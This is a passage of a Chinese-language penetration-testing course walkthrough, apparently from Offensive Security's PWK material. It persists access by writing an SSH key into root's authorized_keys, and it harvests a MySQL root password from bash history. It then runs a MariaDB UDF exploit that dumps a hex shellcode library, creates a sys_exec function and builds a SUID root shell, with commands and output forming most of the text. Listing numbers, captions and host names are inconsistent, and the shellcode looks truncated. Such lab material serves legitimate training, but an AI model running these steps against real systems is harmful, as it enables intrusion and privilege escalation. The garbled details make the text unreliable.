
Your public key has been saved in `/home/kali/.ssh/id_rsa.pub`.

```
```

`kali@kali:~$` `cat ~/.ssh/id_rsa.pub`

`ssh-rsa AAAAB3NC... kali@kali`

```

### Listing 927 - 在 Kali 上生成 SSH key

有了生成的密钥，我们可以使用 Ajla 上的 `authorized_keys` 文件来接受我们的公钥。我们将使用拥有 `root` 权限的会话执行此操作。

```
mkdir /root/.ssh

echo "ssh-rsa AAAAB3NC... kali@kali" > /root/.ssh/authorized_keys
```

现在在 Kali 上使用 `ssh` 客户端连接到 Ajla。

```
kali@kali:~$ ssh root@sandbox.box

Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

...
```

```

root@ajla:-

```

### Listing 929 - 使用 ssh 登录 Ajla

## 寻找数据库凭据

寻找凭据时，我们要像管理员或开发者一样思考。你会在哪里存储凭据？凭据是如何使用的？是否存在可能意外保存凭据的历史或日志文件？

例如，服务器用户误在用户名字段输入密码，这可能会记录在 `/var/log/auth.log` 中。让我们从管理员的角度考虑，查看可能包含信息的位置。

我们首先查看 `/etc/passwd`、`/etc/group` 和 `/etc/shadow`，以了解有多少用户和组可以访问目标系统。

然而，唯一有用信息是存在名为 "`ajla`" 的用户。检查用户的 `ajla` 目录看看能找到什么。

```
root@ajla:~ cd /home/ajla

root@ajla:/home/ajla# ls -alh

total 32K

drwxr-xr-x 3 ajla 4.0K Oct 10 16:37 .bash_history

drwxr-xr-x 3 ajla 4.0K Oct 10 16:22 ..

-rw-r--r-- 1 ajla 15B Dec 10 16:48 .bash_history

-rw-r--r-- 1 ajla 220B Oct 15 17:49 .bash_logout

-rw-r--r-- 1 ajla 376B Oct 15 17 .bashrc

drwx------ 2 ajla 4.0K Oct 15 17:52 .cache

-rw-r--r-- 1 ajla 675B Oct 15 17:49 .profile

-rw-r--r-- 1 ajla 0B Oct 15 17:57 .sudo_admin_successful
```

### Listing 930 - 查看 Ajla 的主目录

我们没有在主目录中发现什么，但让我们看看 `.bash_history` 了解他们做了什么。

```
root@ajla:/home/ajla# cat ./.bash_history

sudo password
```

### Listing 931 - 查看 Ajla 的 .bash_history

这很有趣。空的历史文件意味着该账户并不经常使用。服务器可能被管理过，但我们没有在系统中看到其他其他用户。让我们检查 `root` 用户的历史。

```
root@ajla:/home/ajla# cat ./.bash_history

pwd

ls

cd /var/log/apache2/

tail -f error.log

tail -f access.log

mysql -u root -p8mDu9xUHKe3fZ3iZ7RdhMeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'

cd /etc/mysql/

cd

cd -

ls

ls -alh

exit
```

# 攻击性安全

使用 Kali Linux 2.0 进行渗透测试

`exit`
`root@ajla:/home/ajla#`

> 列表 932 - 查看 root 用户的历史记录

太棒了，`root` 用户曾管理 Ajla，在某个时刻，使用 MySQL 客户端删除了名为 "`database`" 的数据库。对我们来说，密码和用户直接输入在命令行中了！

## 24.5 再次针对数据库

现在我们有了 Zara MariaDB 实例的 `root` 凭据。让我们回去，使用这些新的、更高权限的权限尝试 UDF 漏洞。

### 24.5.1 漏洞利用

提醒一下，我们在列表 933 中找到的 MariaDB 实例上尝试运行的五条命令。

```
select @plugin_dir;

select binary 0xshellcode into dumpfile @plugin_dir;

create function sys_exec returns soname udf_filename;

select * from mysql.func where name='sys_exec';

select sys_exec('cp /bin/sh /tmp/sh; chown root /tmp/sh; chmod +s /tmp/sh')
```

> 列表 933 - MySQL 漏洞拆解

首先，我们将使用之前在 Ajla 上发现并生成的客户端运行 MariaDB 客户端。

```
kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=root -p

Enter password:
```

输入 `'help'` 或 `'\h'` 获取帮助。输入 `'\c'` 清空当前输入语句。

> MariaDB [(none)] - 运行 MariaDB 客户端

接下来，我们将 `shell` 变量设置为我们生成的那个。

```
MariaDB [(none)]> set shell = 0x7f454c460210000000000000000000000003e00100000000011000000000040000000000000000e3b0000000000000000400308000940004001c1b0010000000400000000000000000000000;
```

> 列表 935 - 创建一个 64 位 shell 变量

通过 `set shell` 命令，我们再次验证目录已设置为 `/home/dev/plugin`。如果这对于流程不是必须的，那么确保没有发生变化也是好主意。

```
MariaDB [(none)]> select @plugin_dir;
```

| @plugin_dir |
| :--- |
| /home/dev/plugin/ |
| 1 row in set (0.072) |

PWK 2.0

Copyright © Offensive Security Ltd. All rights reserved.

# 使用 Kali Linux 2.0 进行渗透测试

### 列表 936 - 验证 plugin_dir

现在是见真情的时刻。让我们尝试将二进制文件导出到文件中。

```
MariaDB [(none)] select binary @shell into dumpfile '/home/dev/udf_sys_exec.so';

Query OK, 1 row affected (0.078 sec)
```

### 列表 937 - 将 shell 导出到文件

成功了！在我们开始之前，我们还需要创建一个函数。

```
MariaDB [(none)] create function sys_exec returns soname 'udf_sys_exec.so';

Query OK, 0 rows affected (0.78 sec)
```

### 列表 938 - 创建 UDF

MariaDB 没有给我们提供任何错误，这让我们相信函数已创建。我们可以通过运行查询 `sys_exec` 的命令进行双重检查。

```
MariaDB [(none)] select * from mysql.func where name='sys_exec';

| name | ret | type |
| :--- | :--- | :--- |
| sys_exec | 2 | udf_sys_exec.so |
```
(0.0072 sec)

### 列表 939 - 验证 UDF

现在让我们通过尝试从 Zora 向我们的 Kali 发起网络调用来测试 `sys_exec` 是否工作。为了实现这一点，我们在端口 `80` 上启动服务器并向我们的 Kali 发起 `sys_exec` UDF 调用。

```
kali@kali:~$ sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0:80 ...
```
